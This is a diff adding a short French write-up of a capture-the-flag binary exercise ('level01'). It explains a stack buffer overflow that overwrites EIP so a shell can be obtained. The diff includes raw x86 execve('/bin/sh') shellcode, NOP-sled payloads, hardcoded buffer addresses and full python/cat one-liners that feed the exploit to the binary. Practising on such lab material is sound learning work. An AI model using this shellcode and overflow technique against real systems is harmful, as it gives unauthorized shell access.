@@ -6,3 +6,28 @@ shellcode:
 \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80
 
 password = $(python -c 'print("\x90" * 52 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80" + "\x90" * 4 + "\xcc\xd5\xff\xff")')
+
+buff1 addr = 0x804a040
+buff2 addr = 0xffffd6ac
+
+================================================================================
+
+Dans ce binaire, nous avons un programme qui demande un pseudo et un mot de passe.
+
+Le pseudo (dat_wil) et le mot de pass (admin) sont trouvable sous gdb ou avec la commande strings.
+
+Une fois le mot de passe entree, on nous renvoie un message d'erreur et le programme quit.
+
+Il faut executer un shellcode pour avoir un shell.
+
+Nous avons 2 buffers de 76 octets.
+
+Il faut recuperer l'adresse du premier buffer (0x804a040), la remplire avec 
+le pseudo, 8 octets (pour l'alignement de l'adresse (pas obligatoire)) et notre shellcode.
+
+Ensuite on remplie notre 2eme buffer avec des NOP puis on ecrase EIP par l'addresse
+de notre premier buffer.
+
+On execute en maintenant notre shell avec cat -
+
+cat <(python -c 'print("dat_wil" + "\x90" * 50 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80")') <(python -c 'print("\x90" * 80 + "\x50\xa0\x04\x08")') - | ./level01
